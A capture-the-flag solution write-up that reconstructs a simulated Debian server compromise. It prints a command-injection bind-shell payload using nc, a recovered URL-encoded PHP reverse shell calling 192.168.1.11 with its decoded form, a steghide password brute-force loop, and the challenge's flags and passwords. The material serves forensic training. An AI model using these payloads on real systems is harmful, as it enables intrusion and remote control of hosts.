# BND Forensik challange

# This file provides the solution - and contains therefore spoilers!!!


#### Checksums of challange.ova  
**md5**  
f5b3487acc8509a83e09e4bf8b6faf35  challenge.ova  
**sha1**  
5880d493d6a49393755086282d7633a51aff8d54  challenge.ova  
**sha256**  
367daf77dc630c4fee4a2154fda060b5ca41d98659985ca61fdabac238fd30c4  challenge.ova  

### Provided credentials:
hacker:abcd1234

### Steps to get root password
boot into kali from CD
```
mount /dev/sda1 /mnt
cd /mnt/etc
cat shadow
```
root pwd age:
17129 -> 24.11.2016  

hacker pwd age:  
17123 -> 18.11.2016  
_Note:_ (Dates could have been tampered with as the hacker gained root access)
updated password of root to "toor" using `mkpasswd` and inserting this instead of the real hash.

### General analysis

##### content of /etc/motd
```
This machine has been hacked by Rul0rzZ!
We changed the root password,
so you will never have access to the great data we store here!
```
##### netstat
root@debian:~# netstat -lnp
Active Internet connections (only servers)
```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      401/sshd        
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      695/exim4       
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      373/rpcbind     
tcp        0      0 0.0.0.0:59603           0.0.0.0:*               LISTEN      386/rpc.statd   
tcp6       0      0 :::22                   :::*                    LISTEN      401/sshd        
tcp6       0      0 ::1:25                  :::*                    LISTEN      695/exim4       
tcp6       0      0 :::57934                :::*                    LISTEN      386/rpc.statd   
tcp6       0      0 :::111                  :::*                    LISTEN      373/rpcbind     
tcp6       0      0 :::80                   :::*                    LISTEN      644/apache2     
udp        0      0 0.0.0.0:972             0.0.0.0:*                           373/rpcbind     
udp        0      0 127.0.0.1:986           0.0.0.0:*                           386/rpc.statd   
udp        0      0 0.0.0.0:41487           0.0.0.0:*                           386/rpc.statd   
udp        0      0 0.0.0.0:18495           0.0.0.0:*                           3507/dhclient   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           3507/dhclient   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           3408/dhclient   
udp        0      0 0.0.0.0:111             0.0.0.0:*                           373/rpcbind     
udp        0      0 0.0.0.0:6846            0.0.0.0:*                           3408/dhclient   
udp6       0      0 :::58809                :::*                                386/rpc.statd   
udp6       0      0 :::972                  :::*                                373/rpcbind     
udp6       0      0 :::111                  :::*                                373/rpcbind     
udp6       0      0 :::4888                 :::*                                3408/dhclient   
udp6       0      0 :::47420                :::*                                3507/dhclient   
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name    Path
unix  2      [ ACC ]     STREAM     LISTENING     9740     373/rpcbind         /run/rpcbind.sock
unix  2      [ ACC ]     STREAM     LISTENING     7709     1/init              /run/systemd/private
unix  2      [ ACC ]     SEQPACKET  LISTENING     7731     1/init              /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     7734     1/init              /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     10294    1/init              /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     10297    1/init              /run/acpid.socket
```
##### content of /var/www/html/index.html
```
root@debian:/var/www/html# cat index.html
<html>
	<head>
		<title>Site Hacked!</title>
	</head>

	<body style="background-color: black;">
		<div style="color: green; text-align: center;"><h2>This site has been hacked!</h2>You thought storing the root password in plaintext inside a protected folder is good, huh?!</div>
		<div style="color: red; text-align: center;"><h1>Rul0rzZ</h1></div>
		<p>
		<div style="color: white;text-align: center;">Pay us to get your server back!<br>Send 1BTC to our <a href=#>wallet.</a></div>
	</body>
</html>
```
##### hacker home
```
cat /home/hacker/info
my SSH credentials:
hacker:abcd1234

Info: User hacker is allowed to use sudo for
/sbin/ifconfig and /sbin/dhclient for network configuration.
```
##### root history
```
    1  history
    2  exit
    3  ls
    4  history
    5  cat ~/.bash_history
    6  exit
    7  cat /home/root/Rul0rzZrootPw
    8  passwd
    9  history
   10  steghide
   11  history
   12  exit
   13  visudo
   14  history
   15  exit
```

##### potential root passwords
```
ls -l /home/root/
total 8
-rwx------ 1 root root 21 Nov 23 13:11 root_pw
-rwx------ 1 root root 22 Nov 23 12:57 Rul0rzZrootPw
cat /home/root/root_pw
2Has21sjJ0w3/?dee82H

cat /home/root/Rul0rzZrootPw
JDWbwz334aawefHHwf/)2
```

After resetting the VM the root password proves to be  
_JDWbwz334aawefHHwf/)_

#### Compromise vector (answer to question 1)
Customer access does not sanitize user input
by using adding ";" to the password (and therewith ending the current command), users run shell commands.

**possibility:**  
`; nc -lkp 1234 -e /bin/bash &`  
this spawns a nc listener using bash - from here we can run whatever to call back to our system

##### Apache logs on the system
```
/var/log/apache2/access.log
92.168.1.11 - - [24/Nov/2016:09:28:13 +0100] "GET /index.php HTTP/1.1" 200 1987 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.11 - - [24/Nov/2016:09:28:51 +0100] "GET /index.php?password=password&file=hack HTTP/1.1" 200 1999 "http://192.168.1.10/originalIndex.php" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.11 - - [24/Nov/2016:09:29:02 +0100] "GET /index.php?password=%22%3Exss&file=hack HTTP/1.1" 200 1991 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.11 - - [24/Nov/2016:09:29:09 +0100] "GET /index.php?password=%22%3E%3Cxss&file=hack HTTP/1.1" 200 1991 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.11 - - [24/Nov/2016:09:29:19 +0100] "GET /index.php?password=%27%20ssss&file=hack HTTP/1.1" 200 1991 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.11 - - [24/Nov/2016:09:29:26 +0100] "GET /index.php?password=AAAAAAAAA&file=hack HTTP/1.1" 200 1999 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.11 - - [24/Nov/2016:09:29:32 +0100] "GET /index.php?password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaAAAAAA&file=hack HTTP/1.1" 200 1991 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
[LOGS CUT BY HACKER]
```

The relevant access-logs have been cleaned by the hacker, we need to restore this portion.

using 7z and extracting first the image challange.ova - then the Debian-disk1.vmdk to get access to the Image file.

using strings in combination with grep we get the log files:

**Relevant log line**  
`192.168.1.11 - - [22/Nov/2016:09:48:56 +0100] "GET /originalIndex.php?password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&file=;php%20-r%20%27%24sock%3dfsockopen(%22192.168.1.11%22%2c1234)%3bexec(%22%2fbin%2fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3b%27 HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"`

the file [restored-access.log](assets/restored-access.log) contains the full restore of the access.log.

this line compromises the host using php.
**decoded line**  
`php -r '$sock=fsockopen("192.168.1.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`  
this opens a port (1234) on the address 192.168.1.11.
This address is surprising as 192.168.1.0/16 is normally a internal network.
The Attacker was either on the internal network, or a odd Portforwarding is taking place.
Not knowing the network this is impossible to analyze - however should be looked into before bringing the server back up.


### gaining root (answer to question 2)
the original root-password appears to be in the file /home/root/root_pw

due to permissions, this file can only be read by root.

A Cronjob of root is calling `/var/spool/cron/doAlwaysCron.sh` regularily.  
Permissions on this file allow every user to change the file (which did apparently happen after the compromise according to the file timestamps).

This allowed the privilege escalation to take place.
```
ls -l /var/spool/cron/
total 16
drwxrwx--T 2 daemon daemon  4096 Nov 18 11:20 atjobs
drwxrwx--T 2 daemon daemon  4096 Sep 30  2014 atspool
drwx-wx--T 2 root   crontab 4096 Mar 18 10:28 crontabs
-rwxrwxrwx 1 root   root      29 Nov 23 14:56 doAlwaysCron.sh
```

#### Flag (partial answer to question 3)

steganographically hidden using steghide (in flag image)
using steghide -sf /home/hackedData/flagImage.jpg to extract

###### the password stands out as it's the longest line in the file   `/home/hackedData/hackedPasswords.txt`

###### Alternatively we can bruteforce
`for p in $(cat hackedPasswords.txt) ;do  steghide info flagImage.jpg -p $p > /dev/null 2>&1; if [ $? == "0" ]; then echo $p; fi; done;`

##### decrypt password:  pass
`gr3at3stH4xX0rAl1ve!1`  
command used to decrypt:  
`steghide extract -sf flagImage.jpg -p $(cat pass) -xf flag.txt`

cat flag.txt
```
You solved the challenge!
Here is your nugget <@:-)

H4CK1NG_1S_RE4LY_4WESOM3!
```

#### Data on drive (partial answer to question 3)
/home/hackedData

ll /home/hackedData/
total 120
-rwx------ 1 root root 110758 Nov 18 14:10 flagImage.jpg
-rwx------ 1 root root   7440 Nov 18 13:41 hackedPasswords.txt

hackedPasswords.txt contains 1025 passwords

### additional observations

The compromise did happen ad 22/Nov/2016:09:48:56.

```
ls -la /home/
total 32
drwxr-xr-x  5 root   root   4096 Nov 23 13:26 .
drwxr-xr-x 22 root   root   4096 Nov 18 11:16 ..
drwxr--r--  2 root   root   4096 Nov 24 09:39 hackedData
drwxr-xr-x  2 hacker hacker 4096 Nov 23 12:32 hacker
-rwxr-xr-x  1 root   root   7696 Nov 18 14:30 readFile
-rw-r--r--  1 root   root    539 Nov 23 13:26 readFile.c
drwx---r--  2 root   root   4096 Nov 23 13:11 root
```

Timestamps of readFile (compiled version) and readFile.c (source code) don't match.

compiling the file again `gcc readFile.c -o test` produces a slightly different result.
comparing the files using a hex-editor it becomes apparent that the only difference was the filename of the source-file.

readFile was compiled from source `webvuln.c` - This name suggests that the developer knew that there was a vulnerablity in the code.

Renaming the file readFile.c to webvuln.c and compiling again `gcc webvuln.c -o webvuln` produces exactly the same binary
```
745cd9c54860304ab6f4aec9740445eb2e2540b9  webvuln
745cd9c54860304ab6f4aec9740445eb2e2540b9  readFile
```

This latest finding in combination with the internal IP-Address suggests that this could have been an Insider job.

###### SUDO-rights of the hacker-user

Additionally, the hacker-user has sudo-rights for ifconfig and dhclient.
This was not analyzed any further, however could provide additional vectors to recompromise the system.
